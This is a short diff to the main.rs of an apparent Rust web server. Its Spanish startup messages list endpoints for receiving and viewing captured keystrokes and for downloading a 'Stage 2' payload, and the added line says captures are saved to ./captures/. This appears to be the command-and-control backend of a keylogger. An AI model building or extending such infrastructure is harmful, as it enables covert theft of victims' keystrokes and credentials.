@@ -1,3 +1,4 @@
+// main.rs
 mod routes;
 mod storage;
 
@@ -20,6 +21,7 @@ async fn main() {
     println!("   POST /api/keys    - Recibir teclas");
     println!("   GET  /api/keys    - Ver todas las teclas");
     println!("   GET  /payload     - Descargar Stage 2");
+    println!("📁 Las teclas se guardan en ./captures/");
 
     let listener = TcpListener::bind(addr).await.unwrap();
     axum::serve(listener, app).await.unwrap();
